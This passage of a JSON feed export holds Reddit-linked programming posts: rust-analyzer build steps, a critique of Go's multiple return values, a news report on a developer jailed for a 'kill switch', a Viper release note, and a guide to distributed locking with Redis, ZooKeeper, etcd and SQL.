these are big changes, so we'd appriciate some testing from y'all!</p><p>If you're using Visual Studio Code: 1. Open the \"Extensions\" view () on a Mac;  on other platforms. 2. Find and open the \"rust-analyzer extension\". 3. Assuming it is installed, and click the button that says \"Switch to Pre-Release Version\". VS Code should install a nightly rust-analyzer and prompt you to reload extensions. 4. Let us know if anything's off!</p><h2>Other Editors/Building From Source</h2><p>(Note that rust-analyzer compiles on the latest stable Rust! You do not need a nightly.)</p><ol><li><code>git clone https://github.com/rust-lang/rust-analyzer.git</code>. Make sure you're on the latest commit!</li><li><code>cargo xtask install --server --jemalloc</code>. This will build and place rust-analyzer into into <code>~/.cargo/bin/rust-analyzer</code>.</li><li>Update your your editor to point to that new path. in VS Code, the setting is <code>rust-analyzer.server.path</code>, other editors have some way to override the path. Be sure to point your editor at the  path of <code>~/.cargo/bin/rust-analyzer</code>!</li><li>Restart your editor to make sure it got this configuration change and let us know if anything's off!</li></ol>","contentLength":1858,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Were multiple return values Go's biggest mistake?","url":"https://herecomesthemoon.net/2025/03/multiple-return-values-in-go/","date":1742054834,"author":"/u/SophisticatedAdults","guid":408,"unread":true,"content":"<p><strong>tl;dr: ‘Multiple return values’ in Go interact poorly with other language features. We should probably\n                promote them to full-blown tuple types.</strong></p><p>\n              All of this is normal. Sickos like me  discussing perceived shortcomings of programming\n              languages. It’s nothing personal. I like Go, even, despite its shortcomings.\n            </p><p>\n              My personal candidate for Go’s  historical mistake is that of multiple return values,\n              exactly because of how harmless they look.\n              Multiple return values influenced the design of the language (in bad ways), interact poorly with other\n              features, and <em>make the language much more complex than it has to be</em>.\n            </p><p>Exhibit A, multiple return values:</p><div><pre tabindex=\"0\"><code data-lang=\"go\"></code></pre></div><p>Looking at this, you’d be forgiven for thinking that Go has ’tuples’ (like Python or Rust).</p><p>\n              It doesn’t. There’s no such thing as a ’tuple’. All Go has is a special case syntax which allows functions\n              to return multiple values at the same time. If you want something that sort of behaves like a tuple in Go,\n              you need to define a struct.</p><p>\n              There’s a few other cases of this ‘multiple return values’ behavior special cased for the built-in\n               operator or when accessing a value from a map or channel.\n            </p><div><pre tabindex=\"0\"><code data-lang=\"go\"></code></pre></div><p>\n              What I’m complaining about in this screed is that—as a consequence of putting multiple return values into\n              the language and not making them a dedicated tuple type—Go is in a worse state than it had to be, and that\n              all of this was completely avoidable.\n            </p><p>\n              When I use other languages, I tend to be  that whatever one of my functions spits\n              out, I can put it into a list or vector.\n            </p><p>\n              Through the power of Go, it’s impossible to  pass data around without additional ceremony. I\n              can’t overstate how  it is that in the world of Go, calling a function and being able to\n              store the result in a list is the exception, and not the rule.\n            </p><div><pre tabindex=\"0\"><code data-lang=\"go\"></code></pre></div><p>\n              This (of course) doesn’t compile since  is not a type. Tuples don’t exist. So\n              you  get used to first refactoring all of your functions and defining a whole new struct\n              just to pass some data around. Maybe use two lists? Or a new struct? Amazing.\n            </p><p>This gets significantly more annoying once you try to go concurrent.</p><p>\n              Imagine that you want to spin up some goroutines, have each call\n              <code>func doStuff() (string, error)</code>, and then gather the results. You  pass\n               through a channel since it’s not a standalone type. The usual workaround is\n              to do\n              <a href=\"https://stackoverflow.com/questions/13670818/pair-tuple-data-type-in-go\" target=\"_blank\">whatever this is</a>\n              or to\n              <a href=\"https://herecomesthemoon.net/2025/03/multiple-return-values-in-go/\" target=\"_blank\">define a custom struct</a>:\n            </p><div><pre tabindex=\"0\"><code data-lang=\"go\"></code></pre></div><p>\n              Let me repeat this: Go—a language famous for its concurrency and uncompromising errors-as-values\n              approach—requires you to define a non-standard wrapper type to handle errors as soon as its most basic\n              synchronization primitive is involved or to store  in a slice.\n            </p><p>In other words, <em>Go’s error handling and concurrency don’t compose</em>.</p><p>Hell, even Go’s built-in containers and error handling don’t compose!</p><p>\n              Like many of Go’s problems, it’s something you can work around, but I don’t think that that’s much of an\n              excuse.\n            </p><p>\n              The whole idea behind Go’s error handling is that . You can pass them around\n              like values, inspect them like values, and they’re handled using the same control flow constructs as\n              everything else.\n            </p><p>\n              So despite errors being values, the return of a function call is  not a value at all.\n              You can’t pass it around, you can’t store it.\n            </p><p>\n              A friend of mine has suggested that he believes that “Rob Pike invented Go as a practical joke.”. That’s a\n              pretty rough way too put it, but I can’t entirely blame him? Why would you design a language where the\n              result of a function call cannot be stored or passed around?\n            </p><p>\n              The problem is that this situation was avoidable—if anyone had thought about this in slightly more detail\n              back in the earliest design days—it would’ve been easy to just promote multiple return values to anonymous\n              structs. Instead that time was, presumably, spent adding nonsense like\n              <a href=\"https://go.dev/tour/basics/7\" target=\"_blank\">named return values</a>.\n            </p><p>\n              This is about . Nothing is ‘simple’ about the fact that calling a function doesn’t\n              return a value. It’s a weird idiosyncrasy. By trying to make the language ‘simple’, you played yourself\n              and added a weird edge case.\n            </p><h2>Iterators and ‘Range over Functions’</h2><p>Here’s a basic example of ranging over functions:</p><div><pre tabindex=\"0\"><code data-lang=\"go\"></code></pre></div><p>\n              Just create a constructor function which returns a function which captures variables from the enclosing\n              function scope, and uses them to decide when to call its argument function, thereby determining the\n              behavior of the loop for the end-user. Nothing could possibly be easier. (That’s sarcasm. I find this code\n              hard to read and would’ve preferred an interface-based approach.)\n            </p><p>The Go standard library defines the following types and functions as part of this release:</p><div><pre tabindex=\"0\"><code data-lang=\"go\"></code></pre></div><p>\n              Go cannot handle the case of iterating over one or two values in a uniform, parametrized way. It requires\n              , one for handling one value at a time, and one for two values.\n            </p><div><pre tabindex=\"0\"><code data-lang=\"go\"></code></pre></div><p>\n              Because Go doesn’t have ’tuples’. Why doesn’t Go have tuples? I don’t know—There were\n              <a href=\"https://groups.google.com/g/golang-nuts/c/o8SbEM5GLRw\" target=\"_blank\">some vague discussions in 2009</a>, but it just looks like the Go developers didn’t think of the feature as particularly important. Keeping\n              the language ‘small’ was the higher priority for them.\n            </p><p>\n              Again: This was an attempt to keep the language ‘simple’ which\n              <em>now results in weird, complex edge cases and having to learn twice as many APIs</em>. Congratulations,\n              you tried to simplify and instead just played yourself.\n            </p><p>\n              (Back in the day Go didn’t have generics. Designing a language that interacts poorly with generics under\n              the assumption they’ll never be added was a design tradeoff that probably made sense at the time. Funfact:\n              Go took 5 years until it’s 1.0 release. Rust needed 9 years, and Zig still isn’t there.)\n            </p><p>\n              Take a step back to think about what this means: The designers of the standard library are forced to\n              hardcode specific instances of a type because the language is unable to sufficiently abstract over whether\n              you’re handling one or two values at a time.\n            </p><p>\n              Again: This is not a hard technical problem. There  solutions for this. It’s not even hard if\n              you design a language from the get-go. Go just didn’t implement them.\n            </p><p>\n              Consider what this means for Go’s library ecosystem. If even the standard library easily runs into\n              situations where it’s necessary to <em>work around this limitation</em>, how hard do you think it is a\n              library that does anything slightly fancier? (Again, this limitation extends to error handling, since\n              error handling happens through multiple return values.)\n            </p><p>Warning: Hot opinions ahead, and a bunch of speculation.</p><p>\n              Go’s multiple return value-based error handling was considered to be “good enough”, and prevented the\n              development of a better approach to error handling.\n            </p><p>\n              In reality that could’ve gone either way: The Go developers considered enums and or-operators to be such\n              mysterious, advanced features that there’s no guarantees Go would have ended up with\n              -type based error handling even if multiple return values had never made it into the\n              language.\n            </p><p>For all we know we’d have “Go with exceptions”, which would probably be a step backwards.</p><p>\n              Still: I’ll stand by the fact that multiple return values were a classic ‘worse is better’-type solution\n              that prevented the Go developers from ever  anything even slightly more nuanced,\n              like a\n              <a href=\"https://doc.rust-lang.org/std/result/enum.Result.html\" target=\"_blank\">Result type</a> (aka a sum\n              type purely for error handling, i.e. a value which is either a result  an error).\n            </p><p>\n              Instead, we’re stuck with multiple return values-based error handling. I’m sure you’ve seen people\n              complain about the issues with accidental shadowing of variables. Those make it pretty easy to\n              accidentally forget to check errors. Not a big deal but (once again, this is a running theme here)\n              entirely unnecessary.\n            </p><p>\n              Or taking an example from\n              <a href=\"https://www.dolthub.com/blog/2023-08-16-go-pitfalls/#destructuring-multiple-return-values\" target=\"_blank\">here</a>, that code like this compiles:\n            </p><div><pre tabindex=\"0\"><code data-lang=\"go\"></code></pre></div><p>Or the fact that, no, there’s nothing that stops you from writing functions like this here:</p><div><pre tabindex=\"0\"><code data-lang=\"go\"></code></pre></div><p>Is this bad? Well, it’s by design.</p><p>\n              I am not saying Go’s error handling is . It’s okay. It’s decisively mid-tier, which is a\n              bit embarrassing for a modern green-field project. They had an opportunity to do better than this, and\n              they blew it, and  of these issues are downstream of the decision to standardize on\n              multiple return values as the idiomatic way to handle errors.\n            </p><p>\n              I’ll put my own take on what Go’s error handling should have been like in here since it’s my blog post and\n              you cannot stop me. I’m sure some people will heavily disagree. That’s fine. I think that if Go had\n              standardized around this approach to error handling everyone would’ve gotten used to it.\n            </p><p>\n              Simple, just define a  type that has a  method or operator\n              defined on it that either just passes the value or (if an error is present) wraps it and\n              <em>returns from the function.</em></p><p>\n              You can bikeshed the hell out of this one. Make it a postfix operator instead of a method, if you want.\n              Write  or  to make it stand out more, I don’t care.\n            </p><div><pre tabindex=\"0\"><code data-lang=\"go\"></code></pre></div><ol><li>Vastly better interactions with generics.</li><li>\n                Allows you to store  in slices and pass it around however you please.\n              </li><li>Better for static analysis.</li><li>Less verbose, if you care about that. (I honestly don’t.)</li><li>There’s not even a need for sum types if you don’t want them.</li></ol><p>\n              In practice, it’s too late for invasive changes like that: Go has standardized on multiple return values\n              for error handling, and trying to move away from that would be a fool’s errand.\n            </p><p>\n              Since trying to move towards sum-type-based error handling is a nonstarter unless we want to split the\n              language, let’s ask the obvious question: Is there anything that can be done to improve any of the issues\n              outlined in this post?\n            </p><p>Can we at least promote multiple return values to full blown types and allow generics over them?</p><p>Maybe. That’d be cool. I think it’d be an improvement.</p><p>\n              It’s not entirely trivial though, so let me write down some reasons why it’d be hard, and the changes\n              that’d have to be made.\n            </p><p>\n              You might say “But doesn’t Go have strong backwards compatibility guarantees?” Yeah, it does. That’s what\n              makes it hard. If you could just change stuff however you want, it’d be easy.\n            </p><p>\n              That said, <a href=\"https://go.dev/blog/loopvar-preview\" target=\"_blank\">even Go 1.22</a> made a pretty\n              significant change. You can get pretty far as long as you’re willing to say “Old code will continue to\n              mean exactly what it means today: the fix only applies to new or updated code.”,  you provide\n              tools to auto-fix code during a migration from Go 1.N to Go 1.(N+1).\n            </p><p>In other words, it doesn’t sound impossible.</p><p>\n              In Go, multiple return values are ‘unpacked’ via . This makes the following\n              code syntactically ambiguous due to the optional presence value you can extract from maps:\n            </p><div><pre tabindex=\"0\"><code data-lang=\"go\"></code></pre></div><p>\n              Is this a problem? Eeeeh. It looks like one, but it’s to resolve by just picking one. Since tuples don’t\n              exist in previous versions of Go, old code is just not affected.\n            </p><h4>Multiple Return Value passing</h4><p>Passing multiple return values to a variadic function is currently legal Go code:</p><div><pre tabindex=\"0\"><code data-lang=\"go\"></code></pre></div><p>\n              Does this pass the tuple  to bar as the first argument, or does it automatically unpack\n               to pass the fields as first and second argument?\n            </p><p>\n              Moving away from auto-unpacking would be a breaking change, but if we don’t move away from it then\n              .\n            </p><p>\n              The modern solution to that is pretty simple: First, allow tuples to be unpacked like slices are (i.e. you\n              have to write  to unpack the tuple). Second, add  and\n               commands that identify this issue and fix it when upgrading to the most recent edition\n              of Go.\n            </p><p>\n              Honestly? I thought this would be hard, but as far as language changes go, this seems pretty easy, all\n              things considered.\n            </p><p>\n              If you want to dig deeper into this, you can find\n              <a href=\"https://github.com/golang/go/issues/33080\" target=\"_blank\">a bunch</a> of\n              <a href=\"https://github.com/golang/go/issues/64613\" target=\"_blank\">similar</a> Github\n              <a href=\"https://github.com/golang/go/issues/63221\" target=\"_blank\">issues</a> on these topics. I stumbled\n              upon them when doing research for this blog, I’ve not participated in any of them.\n            </p><p>Maybe I should, though. It would be  to see this one issue finally resolved.</p><p>\n              I don’t know for sure how Go ended up in this weird state with ‘multiple return values’, where it’s\n              impossible to pass function results through a channel or into a slice.\n            </p><p>That one is still baffling to me, so here’s me trying to make sense of it.</p><p>\n              My understanding is that multiple return values were part of Go before its public release. Even in the\n              <a href=\"https://go.dev/doc/devel/weekly\" target=\"_blank\">Weekly Snapshot History</a> that goes all the\n              way back to 2009, there’s only a single mention of multiple return values way back in 2010: “cgo: correct\n              multiple return value function invocations (thanks Christian Himpel)”.</p><p>I imagine the situation played out as follows:</p><p>\n              First of all, multiple return values entered the language . Perhaps via the\n               operator, since someone figured that using a traditional\n              <code>for (int i = 0; i &lt; 100; i++)</code>-style loop just to iterate over the elements of an array or\n              map is too error prone, or perhaps just as a convenience feature.\n            </p><p>\n              Then, the gates of hell opened, demons attacked and the world of programming was set back—no, sorry, I am\n              kidding.\n            </p><p>\n              I assume that what actually happened is that multiple return values were just  and\n              quickly became the idiomatic ‘gold-standard’ for error handling, passing values around, and so on.\n            </p><p>\n              At this point I’m sure that someone asked “Hey, why don’t we just promote those to a full-blown tuple\n              type?”, and was shot down with something like “We already have . There should be a\n              single way of doing things. Go is a simple language. Why would we want to have two features that do the\n              same thing?”\n            </p><p>\n              In either case, at this point multiple return values were here to stay, and the feature established itself\n              as the standard for error handling.\n            </p><p>\n              Looking at the oldest internal discussions in Google’s ‘Golang Nuts’ group (just one or three days after\n              the first\n              <a href=\"https://opensource.googleblog.com/2009/11/hey-ho-lets-go.html\" target=\"_blank\">announcement</a>)\n              is interesting. Say\n              <a href=\"https://groups.google.com/g/golang-nuts/c/TTCaIpSxn2U/m/AQklTsAqi7IJ\" target=\"_blank\">here</a> or\n              <a href=\"https://groups.google.com/g/golang-nuts/c/rvGTZSFU8sY/m/ArU_Ef8Nyl0J\" target=\"_blank\">here</a>. I\n              mean it! Go and take a look. Lines such as “Go doesn’t have nullable types, we haven’t seen a lot of\n              demand for them” really puts things into perspective.\n            </p><p>\n              Give it a few years and we enter the present day, and Go is struggling with some of its earliest design\n              decisions. (Evidence: This entire post. Also,\n              <a href=\"https://github.com/golang/go/issues/49085\" target=\"_blank\">generic methods</a> are still\n              <a href=\"https://go.googlesource.com/proposal/+/refs/heads/master/design/43651-type-parameters.md#No-parameterized-methods\" target=\"_blank\">impossible</a>.)\n            </p><p>\n              Go has these weird special cases (e.g. multiple return values, named return values), decided that ‘and’\n              and ‘or’ are close enough (<a href=\"https://jerf.org/iri/post/2024/go_faq_pipe_in_generics/\" target=\"_blank\">they even made that mistake twice</a>), and many of these problems were <em>intentional design decisions</em> or avoidable.\n            </p><p>\n              The ‘avoidable’ part is a big deal for me. It just feels like a lot of pain could’ve been avoided if Go\n              had spent slightly more time thinking about programming language design.\n            </p><p>\n              Going out on a limb, to me it looks like many of the issues boil down to the question of whether you take\n              types seriously, and are willing to dig into the bare minimum of abstractions to figure out how certain\n              features need to be designed, instead of just making things up as you ™.\n            </p><p>\n              I don’t want to shill for Rust , but one thing that language did well is that it\n               and designed itself around its type system.\n            </p><p> is how it got memory safety without a garbage collector. By\n              <em>moving that information to the type system</em>. This is exactly, intentionally the road that Go\n              didn’t pick.\n            </p><p>\n              Go instead got…multiple return values, which are specifically, intentionally\n              <em>not a type in their own right to keep the language simple</em>. I think this was a bad decision. When\n              it’s easy to codify an abstraction as a type, you  codify it as a type. Go is still\n              learning that lesson today.\n            </p><p>\n              To go out on a positive note—I just spent a whole post complaining about Go, after all—I think that Go is\n              an impressive technical achievement, and set the modern gold standard as far as tooling goes. I am\n              grateful for that. I also really have to respect that its simplicity keeps perfectionism at bay.\n            </p><p>\n              Someday I want to write a post about what I like about Go, but that day is not today. I’ll cross my\n              fingers that tuples are going to be on the list by then.\n            </p>","contentLength":19051,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1jbyghx/were_multiple_return_values_gos_biggest_mistake/"},{"title":"This is what Rust was meant for, right?","url":"https://github.com/giacomo-b/rust-stakeholder","date":1742054422,"author":"/u/jackraddit","guid":378,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1jbyatf/this_is_what_rust_was_meant_for_right/"},{"title":"Fired “Kill Switch” Programmer Faces 10 Years In Jail: What Went Wrong?","url":"https://programmers.fyi/fired-kill-switch-programmer-faces-10-years-in-jail-what-went-wrong","date":1742053967,"author":"/u/derjanni","guid":410,"unread":true,"content":"<p>The 55 year old Texan Davis Lu was just <a href=\"https://www.justice.gov/usao-ndoh/pr/texas-man-formerly-employed-ohio-company-convicted-damaging-source-code-and-deleting\" rel=\"noopener ugc nofollow\" target=\"_blank\">sentenced to 10 years in jail</a> for pulling a “kill switch” on his employer EATON Corporation where he was employed as a Senior Software Developer for Emerging Technologies <a href=\"https://www.theregister.com/2025/03/08/developer_server_kill_switch/\" rel=\"noopener ugc nofollow\" target=\"_blank\"></a><a href=\"https://regmedia.co.uk/2025/03/07/lu.pdf\" rel=\"noopener ugc nofollow\" target=\"_blank\"></a>. Davis build apps that would regularly execute a method called “IsDLEnabledinAD” which stands for “Is Davis Lu enabled in Active Directory”. Once that method failed, his apps would wreak havoc on the systems of his employer.</p><p>When Davis Lu was laid off on September 9th, 2019 his “secret server” in Kentucky started to administer his evil plans. It reaked havoc when his account was removed from the company’s Active Directory. His hidden server housed dozens of Java apps, some going by the name of “Hakai” 破壊 <em>(Japanese for “destruction”)</em> and “Hūnshuì” 昏睡 . Lu’s fellow coworkers found the kill switch after his termination when the apps already interrupted thousands of company users and systems causing severe financial damage to his former employer.</p><blockquote><p>“Sadly, Davis Lu used his education, experience, and skill to purposely harm and hinder not only his employer and their ability to safely conduct business, but also stifle thousands of users worldwide,” <em>— FBI Special Agent, Greg Nelsen</em></p></blockquote>","contentLength":1246,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1jby4uu/fired_kill_switch_programmer_faces_10_years_in/"},{"title":"Is there a Nodejs library you wish existed for Golang?","url":"https://www.reddit.com/r/golang/comments/1jby40e/is_there_a_nodejs_library_you_wish_existed_for/","date":1742053901,"author":"/u/prisencotech","guid":362,"unread":true,"content":"<div><p>People often cite the availability of third party libraries for Node as the reason to prefer it over Golang. Has anyone run into a time when they had to use Node or made do without because a third party library didn't exist?</p></div>   submitted by   <a href=\"https://www.reddit.com/user/prisencotech\"> /u/prisencotech </a>","contentLength":259,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"New Viper release with major improvements","url":"https://www.reddit.com/r/golang/comments/1jbx8d6/new_viper_release_with_major_improvements/","date":1742051515,"author":"/u/sagikazarmark","guid":365,"unread":true,"content":"<p>It comes with a number of improvements:</p><ul><li>Heavily reduced number of third-party dependencies</li><li>New encoding layer for custom encoding formats</li><li>BREAKING: dropped HCL, INI and Java properties from the core (still possible to use through external libraries)</li><li>New file search API allows customizing how Viper looks for config files</li></ul><p>These features has been around for some time in alpha releases, though I haven't received a lot of feedback, so I'm posting here now in the hope that people using Viper will give some after upgrading.</p><p>I worked hard to minimize breaking changes, but it's possible some slipped in. If you find any, feel free to open an issue.</p>","contentLength":640,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Distributed Locking: A Practical Guide","url":"https://www.architecture-weekly.com/p/distributed-locking-a-practical-guide","date":1742051423,"author":"/u/Adventurous-Salt8514","guid":407,"unread":true,"content":"<p><strong>Was your data ever mysteriously overwritten? No? Think again. Have you noticed conflicting updates to the same data?</strong></p><p><strong>In distributed systems, coordination is crucial. </strong></p><p><strong>A distributed lock ensures that if one actor (node, service instance, etc.) changes a shared resource—like a database record, file, or external service—no other node can step in until the first node is finished.</strong></p><p>Today, we’ll try to discuss it and:</p><ol></ol><p>By the end, you should have a decent grasp of distributed locks, enough to make informed decisions about whether (and how) to use them in your architecture.</p><p><strong>who’s in charge of updating shared data?</strong></p><p>For example, you might have:</p><ul><li><p><strong>Multiple Writers are updating the same table row.</strong><strong>That’s a common issue when updating read models.</strong></p></li></ul><p>Without locks, you can get unpredictable states - like a read model flipping from correct to incorrect or a file partially overwritten by multiple workers. Locks sacrifice a bit of parallelism for the certainty that no two nodes update the same resource simultaneously. In many cases, that’s the safest trade-off, especially if data correctness is paramount.</p><p><a href=\"https://event-driven.io/en/idempotent_command_handling/\" rel=\"\">idempotent actions</a><a href=\"https://www.architecture-weekly.com/p/the-write-ahead-log-a-foundation\" rel=\"\">write-ahead logs</a></p><ol><li><ul><li><p>If no lock currently exists, the node creates one, for instance by setting a Redis key with a time-to-live or by creating an ephemeral zNode in ZooKeeper.</p></li><li><p>If another node is holding the lock, this node either waits, fails immediately, or retries, depending on your chosen policy.</p></li></ul></li><li><p><strong>Crash or Automatic Release</strong></p></li></ol><p>The basic flow would look like:</p><p>And the acquisition part with TTL handling:</p><p>There are many tools for distributed locking; let's check the most popular for certain categories.</p><ul><li><p><strong>Kubernetes Single-Instance</strong></p></li></ul><p>Distributed locks all share a common goal: ensure only one node does a particular thing at any given time. However, each tool mentioned approaches the problem with distinct designs, strengths, and failover behaviours.</p><p>Let’s look at each tool’s big-picture purpose—why you’d even consider it—then move on to how it implements (or approximates) a lock. Lastly, let’s discuss a few technical details that matter once you start coding or troubleshooting.</p><p><strong>Redis runs all commands in a single thread, so there is no risk of two commands interfering partway through.</strong></p><p><strong>Redis runs all commands in a single thread, so there is no risk of two commands interfering partway through. </strong></p><p>To create a lock, you need to create a “lock key” using a Redis command, for instance:</p><pre><code>SET lockKey node123 NX EX 30</code></pre><p>That looks cryptic, but let’s see what’s happening behind the scenes:</p><ol><li><p><strong>Atomic Key Creation with NX. </strong></p></li><li><p><code>SET lockKey node123 NX EX 30</code></p></li><li><p><code>SET lockKey node123 NX EX 30</code></p></li><li><p><strong>Handling Network Partitions. </strong><a href=\"https://redis.io/docs/latest/develop/use/patterns/distributed-locks/\" rel=\"\">Redlock algorithm</a></p></li></ol><p>Choosing Redis may be a good option if you already run a Redis cluster for caching or need a lightweight solution that’s easy to integrate. </p><p>Performance is generally good, though absolute consistency under partitions can require more complex setups.</p><p><strong>ZooKeeper and etcd each run as a cluster of nodes that keep data consistent across a majority of them (a quorum).</strong></p><p><strong>You create something like </strong><strong> in ZooKeeper or a key in etcd.</strong></p><p><strong>When you’re done, you delete the ephemeral node or lease key, signalling that source is available.</strong></p><p>Other clients can “watch” that lock path. If the lock holder crashes, ZooKeeper or etcd detects the session loss and removes the node, instantly notifying watchers that the lock is free again. This allows any waiting client to move in and grab the lock right away.</p><p>If a node is isolated from the quorum, ZooKeeper or etcd eventually considers that session dead and removes the ephemeral node. This auto-frees the lock. The newly updated cluster state reflects that the lock is available, so another node can pick it up.</p><p>If your environment already depends on them for cluster metadata or leader election, reusing them for locks is natural. They replicate data across multiple servers, so updates to the lock state are consistent, reducing the risk of split-brain scenarios. The ephemeral mechanism automatically frees locks if a session dies, so you don’t end up with “zombie” locks after crashes.</p><p><strong>They offer stronger consistency guarantees at the cost of heavier operational overhead compared to Redis.</strong></p><p>Sometimes you’d rather avoid setting up additional infrastructure, like Redis or ZooKeeper, and simply rely on the single relational database you already use. Many SQL databases—PostgreSQL, MySQL, SQL Server, and others—provide built-in locking features that can help you coordinate concurrency directly in your existing environment. There are generally two ways to handle locks in a relational database: </p><ul></ul><p><em>“I want exclusive access to something”</em></p><ol></ol><p>They serve different needs, but both let you say, “I want exclusive access to something,” using your existing DB.</p><p>You can lock specific rows in a table by issuing something like:</p><pre><code><code>BEGIN;\nSELECT * FROM locks WHERE lock_id = @loc_key FOR UPDATE;\n/* make changes */\nCOMMIT;\n</code></code></pre><p>That looks cryptic, but here’s what’s happening. </p><p><em>“Lock this row so nobody else can modify it until I’m done.”</em></p><p><strong>The lock lasts until you commit or roll back the transaction.</strong></p><p>You may also use regular rows instead of a dedicated locks table. It’s natural if your concurrency problem revolves around specific table rows. For others you need to define key that would represent the scope of locking</p><pre><code><code>-- PostgreSQL\nSELECT pg_advisory_lock(12345);\n/* do something exclusive */\nSELECT pg_advisory_unlock(12345);\n</code></code></pre><pre><code><code>-- MySQL\nSELECT GET_LOCK('readModel', 10);\n/* do something exclusive */\nSELECT RELEASE_LOCK('readModel');\n</code></code></pre><p><a href=\"https://www.postgresql.org/docs/current/explicit-locking.html#ADVISORY-LOCKS\" rel=\"\">PostgreSQL Advisory Locks</a></p><p>In many cases, database locks require minimal setup. There’s no need to spin up Redis or ZooKeeper if you already trust a single relational DB for everything. You can use familiar SQL, which can benefit many developers. You get transaction integrations.</p><p><strong>Still, they’re tight to a single database scope.</strong></p><p><strong>The other downside is lock contention.</strong></p><p><strong>You also can get deadlocks</strong></p><p>Sometimes, you don’t need a distributed lock at all—you just need to ensure there’s no possibility of concurrency. In Kubernetes, you can tell the cluster to run exactly one replica of your service. With only one pod, you don’t risk two pods writing to the same resource simultaneously. This approach is straightforward but also very limiting.</p><ul><li><p><a href=\"https://kubernetes.io/docs/concepts/workloads/controllers/statefulset/\" rel=\"\">StatefulSet</a></p></li><li><p><strong>No Parallelism or scaling</strong></p></li></ul><p><strong><a href=\"https://etcd.io/\" rel=\"\">etcd</a></strong><a href=\"https://etcd.io/\" rel=\"\">etcd</a></p><p><strong>In Kubernetes, the mechanisms and controllers designed to manage the number of pods are quite robust, but in highly dynamic or unusual situations, there might be brief moments where conditions could lead to more than one pod being created temporarily.</strong></p><ul><li><p><strong>Rapid Scale-Up and Scale-Down:</strong></p></li><li><p><strong>Network Partitions or etcd Availability Issues:</strong></p></li></ul><p><strong>Why You’d Choose Single-Instance in Kubernetes?</strong></p><p>If you just need to enforce that there’s a single instance processing background job (read model handling, job processing) and you have Kubernetes set up, then it’s a decent choice. You remove the concurrency at all. You don’t spin up Redis or ZooKeeper just to handle locks.</p><p><strong>Still, the race conditions can be dangerous for high traffic or important cases. It’s not fully reliable.</strong></p><p>Here’s my recommended decision-making scheme for locking mechanism:</p><ol><li><p><strong>If you have a single relational DB handling all app state, advisory locks might suffice</strong></p></li><li><p><strong>If your environment already includes a Redis cluster for caching and you want a simpler ephemeral lock, Redis is a natural fit.</strong></p></li><li><p><strong>If concurrency is never desired or is completely out of scope for a specific microservice, AND you’re using already Kubernetes a single-instance Kubernetes approach may be acceptable.</strong></p></li><li><p><strong>If your microservices need advanced coordination (like leader election, watchers, or strongly consistent state), consider ZooKeeper or etcd. </strong></p></li></ol><p>If your system needs to acquire multiple locks at once, you risk deadlocks (e.g., process A has Lock1 and wants Lock2; process B has Lock2 and wants Lock1). The best practice is to lock in a consistent order globally or use carefully designed transaction boundaries. I’ll show you next week how you could use queuing and single writer for that.</p><p>Locks serialize access. If too many services fight for the same lock, your system effectively becomes single-threaded. To avoid bottlenecks, lock only the smallest critical sections. If concurrency at some granularity is acceptable, consider sharding or partitioned locks.</p><ul></ul><p>If you rely on a single Redis instance or a single ZooKeeper node, your lock manager can fail. Always consider using a clustered or highly available setup, such as Redis with sentinel or cluster mode or a ZooKeeper ensemble of three or five nodes.</p><p>Systems like Redlock try to handle partial failures, but no distributed lock can be 100% guaranteed if your network is severely partitioned (CAP theorem territory). You might end up with multiple holders, each believing they’re the only one. Proper design, timeouts, and conflict detection help reduce these edge cases.</p><ol><li><p><strong>Try to avoid distributed locking if you can. </strong></p></li></ol><p>Distributed systems will always have complexities, but a well-implemented distributed lock (or a strategic single-instance approach) can tame the chaos of concurrency—keeping your data consistent and your architecture stable.</p><p><strong>What are your experiences, use cases, and challenges with distributed locking?</strong></p><p>And hey, all the best for Christmas if you celebrate it. If you don’t, try to also get the chance to rest a bit. And if you  don’t want to, that’s fine, as long as you’re happy!</p><p><strong>p.s. Ukraine is still under brutal Russian invasion. A lot of Ukrainian people are hurt, without shelter and need help.</strong><a href=\"https://savelife.in.ua/en/donate/\" rel=\"\">Ukraine humanitarian </a><a href=\"https://www.gofundme.com/f/help-to-save-the-lives-of-civilians-in-a-war-zone\" rel=\"\">Ambulances for Ukraine</a><a href=\"https://redcross.org.ua/en/\" rel=\"\">Red Cross</a></p>","contentLength":9564,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1jbx75z/distributed_locking_a_practical_guide/"},{"title":"Pro European Demonstrations in Rome","url":"https://www.reddit.com/r/europe/comments/1jbx4iu/pro_european_demonstrations_in_rome/","date":1742051211,"author":"/u/HuskyBoss219","guid":402,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null}],"tags":["reddit"]}